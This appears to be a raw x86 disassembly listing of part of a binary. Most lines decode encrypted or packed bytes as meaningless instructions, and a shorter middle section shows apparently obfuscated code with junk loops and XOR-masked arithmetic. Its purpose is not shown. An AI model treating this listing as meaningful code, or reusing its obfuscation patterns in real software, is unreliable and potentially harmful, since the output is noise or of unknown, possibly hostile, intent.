  411df6:	adc    bl,BYTE PTR [ecx+0x7b883d44]
  411dfc:	inc    ecx
  411dfd:	sub    ch,ah
  411dff:	add    cl,BYTE PTR [esi]
  411e01:	div    DWORD PTR [edx]
  411e03:	out    0xbb,eax
  411e05:	pushf  
  411e06:	pop    ds
  411e07:	imul   edx,DWORD PTR [eax],0xfd0ee5e7
  411e0d:	or     al,0xa0
  411e0f:	push   es
  411e10:	outs   dx,BYTE PTR ds:[esi]
  411e11:	pop    ebx
  411e12:	jns    0x411e6c
  411e14:	xor    ah,BYTE PTR ds:0x89eb8cfb
  411e1a:	pop    edi
  411e1b:	nop
  411e1c:	cmp    BYTE PTR [edx+0x65],dl
  411e1f:	add    ch,BYTE PTR [eax+edx*8]
  411e22:	adc    eax,0x70de3c78
  411e27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e28:	add    al,0xbb
  411e2a:	xchg   ebp,eax
  411e2b:	inc    eax
  411e2c:	in     eax,0xec
  411e2e:	fadd   QWORD PTR [ebx-0x281226a4]
  411e34:	cld    
  411e35:	sbb    ecx,ebp
  411e37:	mov    eax,ds:0x931bd5c8
  411e3c:	and    DWORD PTR [esi-0x6c],ebp
  411e3f:	in     eax,0x38
  411e41:	adc    BYTE PTR ds:0x884bc0b,bl
  411e47:	icebp  
  411e48:	push   ds
  411e49:	retf   0xd9a9
  411e4c:	or     eax,0xad03f9bb
  411e51:	push   ds
  411e52:	jge    0x411e45
  411e54:	push   ebp
  411e55:	xor    DWORD PTR [edx-0x69],ebp
  411e58:	sbb    edi,DWORD PTR [eax+edx*8-0x3]
  411e5c:	out    0xbc,al
  411e5e:	fcomp  QWORD PTR [eax]
  411e60:	xchg   BYTE PTR [esi],cl
  411e62:	fwait
  411e63:	jb     0x411e6b
  411e65:	sbb    bl,al
  411e67:	ins    DWORD PTR es:[edi],dx
  411e68:	dec    edi
  411e69:	fxch   st(4)
  411e6b:	jp     0x411e72
  411e6d:	cmp    BYTE PTR [eax],0xc2
  411e70:	(bad)  
  411e71:	pushf  
  411e72:	inc    ebp
  411e73:	pushf  
  411e74:	aaa    
  411e75:	imul   edx,esp,0xffffff91
  411e78:	dec    ebp
  411e79:	mov    edx,0xadff748d
  411e7e:	xor    ah,BYTE PTR [esi+0x1fe009ad]
  411e84:	cmp    DWORD PTR [edi+0x29],esi
  411e87:	mov    DWORD PTR [ebp-0x66],ebx
  411e8a:	sbb    al,0x2e
  411e8c:	cmp    DWORD PTR [eax+0x16185de6],esi
  411e92:	bound  edi,QWORD PTR [esi]
  411e94:	fist   WORD PTR [eax-0x376d2109]
  411e9a:	sub    ecx,DWORD PTR [edi+eax*8]
  411e9d:	mov    edx,0xb4a07d0e
  411ea2:	nop
  411ea3:	fistp  DWORD PTR [ebp+0x1a6e4204]
  411ea9:	loop   0x411ef4
  411eab:	push   cs
  411eac:	inc    ebx
  411ead:	fimul  WORD PTR [esi-0x42154d2e]
  411eb3:	ret    
  411eb4:	push   ebx
  411eb5:	popf   
  411eb6:	ins    DWORD PTR es:[edi],dx
  411eb7:	(bad)  
  411eb8:	sbb    bh,bl
  411eba:	call   0xc3b9cebd
  411ebf:	dec    ebx
  411ec0:	and    eax,0x4f7a37d9
  411ec5:	imul   esi,DWORD PTR [ebx-0xb61f994],0xbf6dafa6
  411ecf:	xchg   edi,eax
  411ed0:	sub    esi,edi
  411ed2:	(bad)  
  411ed3:	scas   eax,DWORD PTR es:[edi]
  411ed4:	mov    esi,0x2592d86a
  411ed9:	push   cs
  411eda:	out    dx,al
  411edb:	xchg   esi,eax
  411edc:	ins    DWORD PTR es:[edi],dx
  411edd:	int3   
  411ede:	mov    eax,0x6430a044
  411ee3:	jne    0x411eaa
  411ee5:	inc    edx
  411ee6:	push   ebx
  411ee7:	xchg   esi,eax
  411ee8:	gs int3 
  411eea:	dec    ebp
  411eeb:	and    ch,BYTE PTR [ebp+0x6308ef62]
  411ef1:	or     esp,DWORD PTR [ebx+0x1e576245]
  411ef7:	push   0x2c18e4ba
  411efc:	aad    0x8e
  411efe:	pop    edi
  411eff:	dec    ecx
  411f00:	gs jo  0x411efb
  411f03:	pop    ebp
  411f04:	clc    
  411f05:	sti    
  411f06:	jb     0x411f3a
  411f08:	retf   0x6ee0
  411f0b:	mov    edi,0xa35a4814
  411f10:	or     esi,DWORD PTR [edi+0x60]
  411f13:	mov    ch,0x45
  411f15:	icebp  
  411f16:	pxor   mm2,QWORD PTR [ebp-0x7d]
  411f1a:	jbe    0x411ede
  411f1c:	inc    eax
  411f1d:	mov    eax,ds:0x223dce1e
  411f22:	sbb    DWORD PTR [edx],ebx
  411f24:	stc    
  411f25:	inc    edi
  411f26:	fsub   DWORD PTR [ebx]
  411f28:	out    dx,eax
  411f29:	ds add al,0x90
  411f2c:	or     bh,dh
  411f2e:	sar    BYTE PTR [edi],0x15
  411f31:	mov    WORD PTR [edi],?
  411f33:	add    BYTE PTR [edx-0x2aa2800a],ch
  411f39:	pusha  
  411f3a:	repnz adc BYTE PTR gs:[edi-0x541c96a4],cl
  411f42:	adc    DWORD PTR [esi+edx*4-0xf],ecx
  411f46:	test   DWORD PTR [eax+0x53f987f9],esp
  411f4c:	es pop ebx
  411f4e:	mov    dl,0xf2
  411f50:	xchg   edx,eax
  411f51:	push   edx
  411f52:	imul   ebx,DWORD PTR [ecx],0xc31cb880
  411f58:	lods   al,BYTE PTR ds:[esi]
  411f59:	sar    DWORD PTR [esi+ebx*4+0x44],cl
  411f5d:	test   eax,0xf9707fd0
  411f62:	and    bl,ch
  411f64:	push   eax
  411f65:	xor    eax,0x5c0ea0b9
  411f6a:	idiv   DWORD PTR ds:[esi+0x398e48b]
  411f71:	jecxz  0x411f58
  411f73:	xchg   esp,eax
  411f74:	xchg   ebx,eax
  411f75:	(bad)
  411f78:	mov    ds:0xa0b468fc,al
  411f7d:	mov    ah,0x12
  411f7f:	sbb    DWORD PTR ds:0xb2c1697a,eax
  411f85:	fnsave [ecx]
  411f87:	push   DWORD PTR [ecx]
  411f89:	xor    al,0x98
  411f8b:	adc    ebx,edx
  411f8d:	jmp    0xe9ee:0xe080c8bd
  411f94:	push   eax
  411f95:	and    ebx,DWORD PTR [edx-0x54]
  411f98:	or     ecx,DWORD PTR [ebp-0x16]
  411f9b:	xchg   esi,eax
  411f9c:	fst    QWORD PTR [ebx-0x33]
  411f9f:	test   DWORD PTR [ebx+edi*4],ebp
  411fa2:	loop   0x411f9d
  411fa4:	mov    dl,0xb9
  411fa6:	mov    eax,ds:0x3b58fa0c
  411fab:	inc    edi
  411fac:	scas   eax,DWORD PTR es:[edi]
  411fad:	push   esi
  411fae:	popf   
  411faf:	pop    esi
  411fb0:	popf   
  411fb1:	cmp    al,0x56
  411fb3:	xor    ebp,esp
  411fb5:	mov    ds:0x842aaffc,al
  411fba:	sbb    esp,esi
  411fbc:	fcom   DWORD PTR [edi-0x3bccc4e8]
  411fc2:	(bad)  
  411fc3:	adc    eax,0xb886cb62
  411fc8:	pop    ecx
  411fc9:	inc    esp
  411fca:	xor    DWORD PTR [edx+0x5c],0x4b826ca7
  411fd1:	in     al,0x31
  411fd3:	sbb    ebx,DWORD PTR [ecx+0x2a980ffb]
  411fd9:	add    BYTE PTR [edi+eiz*2],bl
  411fdc:	dec    esp
  411fdd:	clc    
  411fde:	adc    dh,BYTE PTR [ebx+edx*8-0x7d6560c6]
  411fe5:	imul   edx
  411fe7:	(bad)  
  411fe8:	xor    eax,0x51d249c3
  411fed:	not    BYTE PTR [edx+eiz*8]
  411ff0:	sub    ebp,DWORD PTR [edi]
  411ff2:	cmp    edx,esi
  411ff4:	mov    ebp,0x388c55e1
  411ff9:	sub    esp,DWORD PTR [eax]
  411ffb:	mov    eax,ds:0xd3186f2a
  412000:	repnz push cs
  412002:	out    0xb5,eax
  412004:	inc    esp
  412005:	and    DWORD PTR [edx],edi
  412007:	add    BYTE PTR [edx-0x6c],bl
  41200a:	leave  
  41200b:	loop   0x412082
  41200d:	in     eax,dx
  41200e:	xchg   edx,eax
  41200f:	sub    eax,0x2ffa95cf
  412014:	cwde   
  412015:	popf   
  412016:	(bad)  
  412017:	mov    BYTE PTR [ebp-0x3e72dda9],bl
  41201d:	ret    0x6a3b
  412020:	jmp    0x412098
  412022:	adc    al,0xf0
  412024:	loopne 0x411fe6
  412026:	test   BYTE PTR [edi],0xb2
  412029:	or     DWORD PTR [ebx+eax*4-0x3bcdb767],ecx
  412030:	add    eax,0x8d4ade4a
  412035:	sar    ebx,0xf0
  412038:	or     eax,0x6f7d5b1d
  41203d:	shl    BYTE PTR [eax],1
  41203f:	ror    BYTE PTR [esi+0x677b407f],1
  412045:	sbb    eax,0xfbc0d11
  41204a:	pop    esp
  41204b:	and    bh,bh
  41204d:	sar    ah,0x21
  412050:	cmp    BYTE PTR [ebx-0x52ddb8e0],dh
  412056:	mov    dl,0x93
  412058:	cdq    
  412059:	scas   eax,DWORD PTR es:[edi]
  41205a:	(bad)  
  41205b:	ror    ebx,cl
  41205d:	or     esp,eax
  41205f:	xchg   esp,eax
  412060:	push   0x27ff086
  412065:	in     al,0xd3
  412067:	mov    eax,0x5dabb2c0
  41206c:	nop
  41206d:	xor    eax,0x43269742
  412072:	xor    DWORD PTR [edx+0x4ec00628],0xffffff81
  412079:	jmp    0x1dbeed71
  41207e:	adc    al,0x4c
  412080:	std    
  412081:	cmp    eax,0x777dc584
  412086:	xchg   edi,eax
  412087:	sbb    al,0x97
  412089:	mov    BYTE PTR [edi+0x5d],dl
  41208c:	int    0xe0
  41208e:	and    al,0xaa
  412090:	shl    DWORD PTR [ebx-0x141ccdcb],0xd9
  412097:	mov    sp,0x7ce2
  41209b:	dec    ebp
  41209c:	xor    al,BYTE PTR [ebx+0x43]
  41209f:	and    DWORD PTR [ecx+edi*2],ecx
  4120a2:	dec    esi
  4120a3:	dec    esp
  4120a4:	push   es
  4120a5:	mov    bh,0xa1
  4120a7:	sar    edi,0x23
  4120aa:	inc    ecx
  4120ab:	mov    ebx,0x67febb3d
  4120b0:	rcl    BYTE PTR [edi],1
  4120b2:	jmp    0x41203e
  4120b4:	pop    edx
  4120b5:	jno    0x412099
  4120b7:	dec    ebx
  4120b8:	mov    esi,0x258e3c77
  4120bd:	pop    ds
  4120be:	or     eax,0x4582acc1
  4120c3:	fcom   DWORD PTR [edi]
  4120c6:	out    0x64,eax
  4120c8:	out    dx,eax
  4120c9:	push   edx
  4120ca:	imul   edx,DWORD PTR [eax+edi*8-0x30c19610],0x2c
  4120d2:	aam    0x37
  4120d4:	xor    al,0x4a
  4120d6:	push   0x59a7996b
  4120db:	pop    esi
  4120dc:	add    al,0x2f
  4120de:	add    dh,BYTE PTR [ebx]
  4120e0:	imul   eax,DWORD PTR [esi+0x364664d0],0x69730ab3
  4120ea:	lods   eax,DWORD PTR ds:[esi]
  4120eb:	rcr    bl,0xa5
  4120ee:	call   0x76b5caff
  4120f3:	fcmovnu st,st(7)
  4120f5:	mov    ebx,0x51ba154d
  4120fa:	int3   
  4120fb:	xor    al,0x33
  4120fd:	sub    al,0x45
  4120ff:	jmp    0x4120b4
  412101:	mov    ds:0xb826e249,al
  412106:	adc    esp,ebp
  412108:	loopne 0x412145
  41210a:	inc    edi
  41210b:	push   edx
  41210c:	pop    ebp
  41210d:	fs dec esi
  412110:	jo     0x412157
  412112:	sti    
  412113:	xchg   esi,eax
  412114:	jmp    0x623c:0x2d2ea368
  41211b:	out    dx,al
  41211c:	test   eax,0x926c5e97
  412121:	arpl   WORD PTR [ebx],dx
  412123:	pop    edx
  412124:	inc    eax
  412125:	mov    es,WORD PTR [ecx+0x46]
  412128:	gs stos DWORD PTR es:[edi],eax
  41212a:	outs   dx,DWORD PTR ds:[esi]
  41212b:	push   ss
  41212c:	sbb    ah,BYTE PTR [ebx]
  41212e:	ins    BYTE PTR es:[edi],dx
  41212f:	add    BYTE PTR [ebx+edi*2],0xa2
  412133:	das    
  412134:	mov    ch,0x32
  412136:	inc    eax
  412137:	std    
  412138:	aas    
  412139:	clc    
  41213a:	mov    edi,0x5816fa30
  41213f:	test   esi,0xb74c1495
  412145:	mov    dh,bh
  412147:	les    edi,FWORD PTR [ebx+0x78]
  41214a:	mov    dh,0x3d
  41214c:	mov    ebp,0xa5aeee06
  412151:	icebp  
  412152:	cmp    esp,DWORD PTR [esi]
  412154:	test   al,0x7e
  412156:	inc    eax
  412157:	loopne 0x41218c
  412159:	add    ch,BYTE PTR [ecx]
  41215b:	mov    edi,0xb0d36358
  412160:	in     eax,dx
  412161:	inc    edi
  412162:	sbb    dl,BYTE PTR [esi+0x5]
  412165:	iret   
  412166:	mov    ch,0xec
  412168:	shl    ebp,0x81
  41216b:	sar    DWORD PTR [ecx],cl
  41216d:	pop    esp
  41216e:	jb     0x41216a
  412170:	out    dx,eax
  412171:	inc    edi
  412172:	sti    
  412173:	jp     0x4121ef
  412175:	and    ebp,DWORD PTR [ecx-0x78892e85]
  41217b:	std    
  41217c:	mov    bl,0x3f
  41217e:	sbb    BYTE PTR [edx],0xe0
  412181:	pop    es
  412182:	jg     0x412148
  412184:	xchg   ebp,eax
  412185:	loop   0x4121a2
  412187:	inc    ecx
  412188:	int3   
  412189:	rcl    DWORD PTR [eax-0x3],0xf6
  41218d:	ror    DWORD PTR [ebx],1
  41218f:	add    BYTE PTR [esi],0x2a
  412192:	sbb    dl,dh
  412194:	out    dx,eax
  412195:	test   eax,0xbb4618a3
  41219a:	lods   al,BYTE PTR ds:[esi]
  41219b:	les    edx,FWORD PTR [edx-0x2f3987ac]
  4121a1:	das    
  4121a2:	loop   0x4121ae
  4121a4:	(bad)  
  4121a6:	sub    eax,0xf0ba9946
  4121ab:	xor    BYTE PTR [edi+edi*1],bl
  4121ae:	stos   BYTE PTR es:[edi],al
  4121af:	and    eax,0xc9db14df
  4121b4:	repnz clc 
  4121b6:	sub    bl,bl
  4121b8:	inc    edi
  4121b9:	aad    0x71
  4121bb:	in     eax,0x2d
  4121bd:	mov    ebx,0xb55197c4
  4121c2:	leave  
  4121c3:	push   0xffffff9f
  4121c5:	mov    ebp,0x4149fb15
  4121ca:	mov    esp,0x9711f4d4
  4121cf:	sub    eax,0x397e13d5
  4121d4:	(bad)  
  4121d5:	fidivr DWORD PTR [ebp-0x69290f79]
  4121db:	aas    
  4121dc:	add    BYTE PTR [ebp+0x5267fc63],ah
  4121e2:	(bad)  
  4121e3:	jno    0x41221c
  4121e5:	sub    DWORD PTR [ebp+0x1],esi
  4121e8:	and    eax,0x79e5b8b2
  4121ed:	add    BYTE PTR [ebx],bl
  4121ef:	lock enter 0x8bef,0xa5
  4121f4:	imul   esp,DWORD PTR [edx+0xcda42a4],0x38185c2e
  4121fe:	dec    ebx
  4121ff:	loop   0x4121bb
  412201:	dec    ebp
  412202:	mov    eax,0x40fc8dbd
  412207:	push   edx
  412208:	push   eax
  412209:	sbb    ch,BYTE PTR [ebp+0x78f50b47]
  41220f:	jle    0x4121cf
  412211:	add    bl,bl
  412213:	test   DWORD PTR [ebp+0x682349c8],0x9e05fcda
  41221d:	dec    ecx
  41221e:	cmp    ebp,DWORD PTR [ebp-0x34]
  412221:	adc    BYTE PTR [edx],cl
  412223:	mov    ebx,0x280b1dfc
  412228:	fdivr  st(3),st
  41222a:	sub    dl,BYTE PTR [esi-0x5c]
  41222d:	sub    eax,0x43a5442
  412232:	mov    ch,0xc0
  412234:	(bad)  
  412236:	mov    DWORD PTR [ecx],edi
  412238:	and    cl,0x5e
  41223b:	adc    eax,0x8b727af1
  412240:	push   ss
  412241:	mov    edi,0xa48f74b0
  412246:	xor    cl,BYTE PTR [ebp-0x7a689726]
  41224c:	out    0x49,eax
  41224e:	rcl    BYTE PTR [ebp+0x60ebec88],0x72
  412255:	stos   DWORD PTR es:[edi],eax
  412256:	inc    edi
  412257:	inc    eax
  412258:	fwait
  412259:	std    
  41225a:	mov    dh,bl
  41225c:	dec    ebp
  41225d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41225e:	(bad)  
  41225f:	pop    esi
  412260:	ret    0xef53
  412263:	test   al,0x70
  412265:	mov    ?,ebx
  412267:	mov    ch,0x96
  412269:	push   es
  41226a:	mov    ch,0x7b
  41226c:	pop    eax
  41226d:	inc    esp
  41226e:	push   es
  41226f:	imul   ecx,esi,0x4f
  412272:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412273:	mov    dl,BYTE PTR [edx-0x7888146e]
  412279:	xor    BYTE PTR [edx-0x52],ch
  41227c:	repnz aas 
  41227e:	scas   al,BYTE PTR es:[edi]
  41227f:	jns    0x4122a8
  412281:	pop    esi
  412282:	out    dx,eax
  412283:	test   eax,0xa2e8081b
  412288:	stos   DWORD PTR es:[edi],eax
  412289:	push   esi
  41228a:	ins    BYTE PTR es:[edi],dx
  41228b:	aam    0xee
  41228d:	push   ss
  41228e:	stos   BYTE PTR es:[edi],al
  41228f:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412291:	mov    esp,0x6732b487
  412296:	das    
  412297:	js     0x412285
  412299:	mov    ?,WORD PTR [ebx-0x42119fd2]
  41229f:	stos   DWORD PTR es:[edi],eax
  4122a0:	mov    dl,0x8f
  4122a2:	cmp    ecx,DWORD PTR [ecx+0x12]
  4122a5:	xchg   esi,eax
  4122a6:	(bad)  
  4122a8:	inc    esi
  4122a9:	xor    al,0x30
  4122ab:	mov    ebp,0x16f2ec0f
  4122b0:	(bad)  
  4122b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122b2:	aam    0xa0
  4122b4:	jl     0x412271
  4122b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122b7:	(bad)  
  4122b8:	sbb    eax,0x5ddc2b8d
  4122bd:	rcr    BYTE PTR [edi+ecx*4-0x22],0x67
  4122c2:	ins    DWORD PTR es:[edi],dx
  4122c3:	lds    edx,FWORD PTR [edi-0x24]
  4122c6:	into   
  4122c7:	or     ecx,DWORD PTR [ebx+0x64]
  4122ca:	ins    BYTE PTR es:[edi],dx
  4122cb:	(bad)  
  4122cc:	xor    eax,0xbbf4624
  4122d1:	rcl    BYTE PTR [edi],0xd9
  4122d4:	out    dx,eax
  4122d5:	js     0x412260
  4122d7:	int3   
  4122d8:	cmp    DWORD PTR [eax],ecx
  4122da:	xor    eax,0x1f9712a9
  4122df:	xlat   BYTE PTR ds:[ebx]
  4122e0:	xor    eax,0xb36bfa15
  4122e5:	pusha  
  4122e6:	outs   dx,BYTE PTR ds:[esi]
  4122e7:	lock add al,0xc2
  4122ea:	jle    0x412274
  4122ec:	fs cs test eax,0x47c26f4b
  4122f3:	inc    ecx
  4122f4:	pop    ebx
  4122f5:	sbb    esi,DWORD PTR [ebx]
  4122f7:	es test eax,0xde44ccf9
  4122fd:	gs xchg ebp,eax
  4122ff:	jp     0x4122d9
  412301:	sub    eax,0xe3b2f059
  412306:	lods   eax,DWORD PTR ds:[esi]
  412307:	mov    dh,0x2b
  412309:	(bad)  
  41230a:	outs   dx,DWORD PTR ds:[esi]
  41230b:	add    esp,esp
  41230d:	test   cl,ah
  41230f:	mov    WORD PTR [edx+0x53],?
  412312:	into   
  412313:	pop    esi
  412314:	sub    BYTE PTR [ebx],al
  412316:	push   ss
  412317:	arpl   WORD PTR [edx],di
  412319:	scas   eax,DWORD PTR es:[edi]
  41231a:	xchg   ebx,eax
  41231b:	in     al,0x32
  41231d:	cmp    DWORD PTR [esp+edi*4],eax
  412320:	aas    
  412321:	dec    ebp
  412322:	fidivr DWORD PTR ss:[esi-0x14b357c5]
  412329:	in     al,dx
  41232a:	pop    ds
  41232b:	test   al,0x53
  41232d:	xor    cl,bl
  41232f:	push   ds
  412330:	popf   
  412331:	mov    esi,0x4e36487
  412336:	stos   DWORD PTR es:[edi],eax
  412337:	test   BYTE PTR [ebx-0x3d855167],0x8a
  41233e:	jbe    0x4122d7
  412340:	xchg   ecx,eax
  412341:	jo     0x412357
  412343:	sbb    DWORD PTR [eax+ebx*4+0x2d],0x2a
  412348:	and    edi,DWORD PTR [ecx-0x47]
  41234b:	hlt    
  41234c:	fldcw  WORD PTR [esi-0x2b219554]
  412352:	sub    ecx,0x1f60b27b
  412358:	xchg   ebp,eax
  412359:	mov    edx,DWORD PTR [ebp+0x8]
  41235c:	and    DWORD PTR ds:0x42b21a,0x0
  412366:	jmp    0x41237a
  41236b:	xor    ebx,ebx
  41236d:	xor    ebx,DWORD PTR ds:0x42b21a
  412373:	inc    ebx
  412374:	mov    DWORD PTR ds:0x42b21a,ebx
  41237a:	cmp    DWORD PTR ds:0x42b21a,0x18
  412381:	jae    0x4123c1
  412387:	cmp    DWORD PTR ds:0x42b21a,0x4
  41238e:	jg     0x4123c1
  412394:	jmp    0x4123a2
  412399:	push   DWORD PTR [ebp-0x18]
  41239c:	call   DWORD PTR ds:0x42b316
  4123a2:	cmp    DWORD PTR ds:0x42b21a,0x3
  4123a9:	jne    0x4123bc
  4123af:	mov    ebx,DWORD PTR ds:0x42b21a
  4123b5:	inc    ebx
  4123b6:	mov    DWORD PTR ds:0x42b21a,ebx
  4123bc:	jmp    0x41236b
  4123c1:	mov    ebx,DWORD PTR [ebp-0x54]
  4123c4:	mov    DWORD PTR ds:0x42b21a,0x6966
  4123ce:	add    edx,0x64f880
  4123d4:	or     edx,ebx
  4123d6:	mov    DWORD PTR [ebp-0x54],edx
  4123d9:	mov    edx,DWORD PTR [ebp+0x8]
  4123dc:	xor    DWORD PTR ds:0x42b1b2,edx
  4123e2:	mov    ebx,DWORD PTR [ebp-0x50]
  4123e5:	and    DWORD PTR ds:0x42b226,0x42b18e
  4123ef:	add    edx,ecx
  4123f1:	sbb    DWORD PTR ds:0x42b1ee,0x42b196
  4123fb:	xor    edx,ebx
  4123fd:	mov    DWORD PTR [ebp-0x50],edx
  412400:	mov    DWORD PTR ds:0x42b226,0x2b16
  41240a:	mov    edx,DWORD PTR [ebp+0x8]
  41240d:	and    DWORD PTR ds:0x42b19e,0x0
  412417:	mov    ebx,DWORD PTR ds:0x42b19e
  41241d:	inc    ebx
  41241e:	mov    DWORD PTR ds:0x42b19e,ebx
  412424:	cmp    DWORD PTR ds:0x42b19e,0xc
  41242b:	ja     0x41246b
  412431:	jmp    0x412444
  412436:	push   DWORD PTR [ebp-0x10]
  412439:	push   0x7c16
  41243e:	call   DWORD PTR ds:0x42b31a
  412444:	cmp    DWORD PTR ds:0x42b19e,0xb
  41244b:	jne    0x41245e
  412451:	mov    ebx,DWORD PTR ds:0x42b19e
  412457:	inc    ebx
  412458:	mov    DWORD PTR ds:0x42b19e,ebx
  41245e:	cmp    DWORD PTR ds:0x42b19e,0x13
  412465:	jb     0x412417
  41246b:	mov    ebx,DWORD PTR [ebp-0x4c]
  41246e:	add    edx,edi
  412470:	and    edx,ebx
  412472:	mov    ebx,DWORD PTR ds:0x42b206
  412478:	add    DWORD PTR ds:0x42b1c6,ebx
  41247e:	mov    DWORD PTR [ebp-0x4c],edx
  412481:	add    DWORD PTR ds:0x42b19a,0x5c82
  41248b:	mov    edx,DWORD PTR [ebp+0x8]
  41248e:	mov    ebx,DWORD PTR [ebp-0x48]
  412491:	lea    edx,[ebx+edx*1+0x241fcdf]
  412498:	mov    DWORD PTR [ebp-0x48],edx
  41249b:	mov    edx,DWORD PTR [ebp+0x8]
  41249e:	mov    ebx,0xfa5e1524
  4124a3:	sub    ebx,edx
  4124a5:	add    ebx,DWORD PTR [ebp-0x44]
  4124a8:	mov    DWORD PTR [ebp-0x44],ebx
  4124ab:	mov    edx,DWORD PTR [ebp+0x8]
  4124ae:	xor    edx,eax
  4124b0:	add    edx,esi
  4124b2:	jne    0x40fdfa
  4124b8:	jmp    0x419191
  4124bd:	mov    edx,DWORD PTR [ebp-0xc]
  4124c0:	sub    edx,esi
  4124c2:	xor    edx,eax
  4124c4:	mov    DWORD PTR [ebp-0x5c],edx
  4124c7:	mov    edx,DWORD PTR [ebp-0x10]
  4124ca:	mov    ebx,DWORD PTR [ebp-0x8]
  4124cd:	xor    edx,eax
  4124cf:	xor    ebx,eax
  4124d1:	sub    edx,ebx
  4124d3:	sub    edx,esi
  4124d5:	xor    edx,eax
  4124d7:	mov    DWORD PTR [ebp-0x10],edx
  4124da:	mov    edx,DWORD PTR [ebp-0x14]
  4124dd:	mov    DWORD PTR [ebp+0x8],edx
  4124e0:	jmp    0x4148b5
  4124e5:	mov    edx,DWORD PTR [ebp+0x8]
  4124e8:	mov    ebx,DWORD PTR [ebp-0x8]
  4124eb:	xor    edx,eax
  4124ed:	xor    ebx,eax
  4124ef:	sub    edx,ebx
  4124f1:	sub    edx,esi
  4124f3:	xor    edx,eax
  4124f5:	mov    DWORD PTR [ebp+0x8],edx
  4124f8:	mov    edx,DWORD PTR [ebp+0x8]
  4124fb:	mov    ebx,DWORD PTR [ebp-0x58]
  4124fe:	add    edx,0x5708e2
  412504:	imul   edx,ebx
  412507:	mov    DWORD PTR [ebp-0x58],edx
  41250a:	mov    edx,DWORD PTR [ebp+0x8]
  41250d:	mov    ebx,DWORD PTR [ebp-0x54]
  412510:	add    edx,0x64f880
  412516:	or     edx,ebx
  412518:	mov    DWORD PTR [ebp-0x54],edx
  41251b:	mov    edx,DWORD PTR [ebp+0x8]
  41251e:	mov    ebx,DWORD PTR [ebp-0x50]
  412521:	add    edx,ecx
  412523:	xor    edx,ebx
  412525:	mov    DWORD PTR [ebp-0x50],edx
  412528:	mov    edx,DWORD PTR [ebp+0x8]
  41252b:	mov    ebx,DWORD PTR [ebp-0x4c]
  41252e:	add    edx,edi
  412530:	and    edx,ebx
  412532:	mov    DWORD PTR [ebp-0x4c],edx
  412535:	mov    edx,DWORD PTR [ebp+0x8]
  412538:	mov    ebx,DWORD PTR [ebp-0x48]
  41253b:	lea    edx,[ebx+edx*1+0x241fcdf]
  412542:	mov    DWORD PTR [ebp-0x48],edx
  412545:	mov    edx,DWORD PTR [ebp+0x8]
  412548:	mov    ebx,0xfa5e1524
  41254d:	sub    ebx,edx
  41254f:	add    ebx,DWORD PTR [ebp-0x44]
  412552:	mov    DWORD PTR [ebp-0x44],ebx
  412555:	jmp    0x4148b5
  41255a:	xlat   BYTE PTR ds:[ebx]
  41255b:	push   ss
  41255c:	xchg   BYTE PTR [ebx-0x7e],dh
  41255f:	repz xchg edx,eax
  412561:	add    BYTE PTR [eax-0x49],0xdb
  412565:	div    al
  412567:	jbe    0x41251b
  412569:	inc    edx
  41256a:	cli    
  41256b:	mov    al,BYTE PTR [ebx-0x7ca1c17d]
  412571:	sbb    DWORD PTR [edx+0x24014835],0xfffffff2
  412578:	adc    BYTE PTR cs:[edx+0x1],ch
  41257c:	out    dx,al
  41257d:	ret    
  41257e:	inc    ebx
  41257f:	xor    BYTE PTR [edi],0xc6
  412582:	scas   eax,DWORD PTR es:[edi]
  412583:	imul   ecx,DWORD PTR [edi-0x6bc5b510],0x8054f401
  41258d:	mov    cl,0x19
  41258f:	icebp  
  412590:	pushf  
  412591:	(bad)
  412594:	retf   0x2e0
  412597:	rcl    BYTE PTR [eax-0x631e07eb],cl
  41259d:	js     0x4125a3
  41259f:	shl    BYTE PTR [eax],1
  4125a1:	fisttp WORD PTR [ebp-0x610939ba]
  4125a7:	add    al,0x6
  4125a9:	out    dx,al
  4125aa:	pushf  
  4125ab:	mov    ch,BYTE PTR ds:0xce3165b1
  4125b1:	fmul   DWORD PTR [ecx-0x10]
  4125b4:	ds ins DWORD PTR es:[edi],dx
  4125b6:	lds    esi,FWORD PTR [ebp-0x53bf6597]
  4125bc:	je     0x4125e6
  4125be:	aam    0xe6
  4125c0:	pusha  
  4125c1:	das    
  4125c2:	loop   0x41255e
  4125c4:	gs mov ebp,0x29b105e4
  4125ca:	and    edi,ebx
  4125cc:	jb     0x41255e
  4125ce:	jbe    0x41261f
  4125d0:	push   ds
  4125d1:	(bad)  
  4125d2:	mov    eax,ds:0xb9d55d43
  4125d7:	int3   
  4125d8:	mov    al,0x6b
  4125da:	push   edi
  4125db:	inc    esp
  4125dc:	stc    
  4125dd:	push   0xffffff8f
  4125df:	adc    al,BYTE PTR [edi]
  4125e1:	adc    DWORD PTR [ecx],ebp
  4125e3:	test   eax,0x1acbe172
  4125e8:	add    ebx,esp
  4125ea:	jo     0x41261a
  4125ec:	add    cl,ch
  4125ee:	sbb    eax,0xac369684
  4125f3:	mov    ebx,0xc732bba2
  4125f8:	and    cl,BYTE PTR [ebp+0x71f5e04e]
  4125fe:	fs mov esp,0x60c5d65c
  412604:	data16 sub cl,0xae
  412608:	mov    ecx,0xcfa90336
  41260d:	out    dx,al
  41260e:	in     eax,0x46
  412610:	lahf   
  412611:	cmc    
  412612:	into   
  412613:	xor    DWORD PTR [edx],esp
  412615:	ss jecxz 0x412668
  412618:	pop    ss
  412619:	dec    edi
  41261a:	imul   ebx,DWORD PTR [edi-0x69f52939],0x2855def9
  412624:	adc    dl,BYTE PTR [ebx]
  412626:	push   eax
  412627:	(bad)  
  412628:	sbb    al,0xbe
  41262a:	push   edi
  41262b:	cmp    eax,0xe28df5c9
  412630:	imul   eax,esp,0x73
  412633:	mov    esi,0xf0ecbea5
  412638:	sub    ecx,esp
  41263a:	xchg   ebp,eax
  41263b:	jecxz  0x4126b4
  41263d:	arpl   bp,sp
  41263f:	daa    
  412640:	fwait
  412641:	shl    ah,0xb2
  412644:	mov    ah,0xc4
  412646:	(bad)  
  412647:	sbb    BYTE PTR [esp+ebp*1+0xa],ah
  41264b:	fnstcw WORD PTR [esi]
  41264d:	jp     0x412693
  41264f:	xchg   BYTE PTR [edi+eax*1],cl
  412652:	call   0x1e89cf31
  412657:	fs in  eax,dx
  412659:	clc    
  41265a:	push   ds
  41265b:	xchg   esp,eax
